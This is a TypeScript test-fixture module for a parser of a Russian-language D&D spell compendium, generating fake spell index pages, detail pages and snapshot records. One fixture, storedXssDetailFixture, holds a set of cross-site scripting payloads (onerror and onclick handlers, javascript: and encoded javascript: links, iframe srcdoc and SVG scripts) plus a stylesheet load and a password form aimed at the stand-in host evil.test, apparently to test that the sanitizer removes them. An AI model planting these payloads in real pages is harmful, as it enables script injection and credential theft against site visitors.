import { createHash } from "node:crypto";

import type { SnapshotDetail } from "../../../src/server/compendium/next-dnd/collector.ts";
import { parseNextDndIndex } from "../../../src/server/compendium/next-dnd/parser.ts";

export function spellIndexFixture(count = 411): string {
  const cards = Array.from({ length: count }, (_, index) => index === 0 ? {
    title: "Метка охотника",
    title_sort: "МЕТКА ОХОТНИКА",
    title_en: "Hunter's Mark",
    link: "/spells/10195-hunters-mark",
    level: 1,
    school: "Прорицание",
    item_prefix: 1,
    item_prefix_title: "1 уровень",
    item_tags: { concentration: { tag_value: "К", tag_title: "Концентрация" } },
    item_suffix: "В..",
    item_icon: "spell_school_divination",
    item_icon_title: "Прорицание",
    filter_text: "метка охотника hunter's mark",
    filter_level: [1],
    filter_class: [17],
    filter_subclass: [133],
    filter_source: [301],
    filter_school: [8],
  } : {
    title: `Fixture spell ${index + 1}`,
    title_sort: `FIXTURE SPELL ${index + 1}`,
    title_en: `Fixture Spell ${index + 1}`,
    link: `/spells/${20000 + index}-fixture-spell-${index + 1}`,
    level: index % 10,
    school: "Воплощение",
    item_prefix_title: `${index % 10} уровень${index % 2 === 0 ? ", ритуал" : ""}`,
    item_tags: {
      ...(index % 2 === 0 ? { ritual: { tag_value: "Р", tag_title: "Ритуал" } } : {}),
      ...(index % 3 === 0 ? { concentration: { tag_value: "К", tag_title: "Концентрация" } } : {}),
    },
    filter_class: [17],
    filter_source: [301],
  });
  return `<!doctype html><html><body><ul id="list"></ul><script>window.LIST = ${JSON.stringify({
    cards,
    order: { title: "Название", level: "Уровень", school: "Школа" },
    category: "spells",
  })};</script></body></html>`;
}

export function spellDetailFixture(externalId: string, includeCard = true): string {
  return `<!doctype html><html><body>
    <header>Site navigation</header>
    <aside><nav>Partners navigation</nav><form class="form-auth">Password</form></aside>
    ${includeCard ? `<article class="paper card active" data-id="spells:${externalId}">
      <div class="card-menu">Edit navigation</div>
      <h2 class="card-title"><span data-copy="Fixture Spell [Fixture Spell]">Fixture Spell</span></h2>
      <div class="card__body"><p><b>Duration:</b> 1 minute.</p><p>Rules text retained.</p></div>
      <section class="comments"><p>Comment must be excluded.</p></section>
      <a class="partner">Partner must be excluded.</a>
      <footer class="card__footer">Card navigation</footer>
    </article>` : "<main>Parser-breaking fixture</main>"}
    <section class="comments">Outside comment</section>
  </body></html>`;
}

export function storedXssDetailFixture(externalId: string): string {
  return `<!doctype html><article class="card" data-id="spells:${externalId}" onclick="steal()">
    <h2 class="card-title"><span data-copy="Safe spell">Safe spell</span></h2>
    <p style="background:url(javascript:steal())" onmouseover="steal()">Retained rules</p>
    <a href="javascript:steal()" title="unsafe protocol">bad link</a>
    <a href="&#x6a;avascript:steal()">encoded bad link</a>
    <a href="https://example.com/rule" target="_blank" rel="opener">safe link</a>
    <img src="x" onerror="steal()"><iframe srcdoc="&lt;script&gt;steal()&lt;/script&gt;"></iframe>
    <svg><script>steal()</script><a href="javascript:steal()">svg</a></svg>
    <object data="javascript:steal()"></object><embed src="data:text/html,x"><link rel="stylesheet" href="//evil.test/x.css">
    <form action="https://evil.test"><input name="password"></form>
  </article>`;
}

export function spellDetailsFixture(count = 411): SnapshotDetail[] {
  const indexHtml = spellIndexFixture(count);
  const parsed = parseNextDndIndex(indexHtml, "https://next.dnd.su/spells/", "spells");
  const indexSha256 = createHash("sha256").update(indexHtml).digest("hex");
  return parsed.entries.map((entry, index) => {
    const externalId = entry.externalId;
    const sha256 = createHash("sha256").update(`spell-fixture-${externalId}`).digest("hex");
    const sourceUrl = entry.sourceUrl;
    return {
      kind: "detail", category: "spells", externalId, sourceUrl, finalUrl: sourceUrl, redirectChain: [],
      fetchedAt: "2026-08-06T12:00:00.000Z", sha256, byteLength: 512,
      parserVersion: "next-dnd-2024-v3", blobPath: `blobs/${sha256}.html`,
      normalized: {
        title: entry.title, contentHtml: `<article>${entry.title}</article>`,
        contentText: `Casting Time: 1 action. Range: 60 feet. Components: V, S. Duration: 1 minute. Fixture rules ${index + 1}.`,
      },
      indexMetadata: entry.metadata,
      indexSource: {
        url: "https://next.dnd.su/spells/", fingerprintSha256: indexSha256,
        rawBlobPath: `blobs/${indexSha256}.html`, fetchedAt: "2026-08-06T12:00:00.000Z",
        cardFingerprintSha256: entry.cardFingerprintSha256,
      },
    };
  });
}
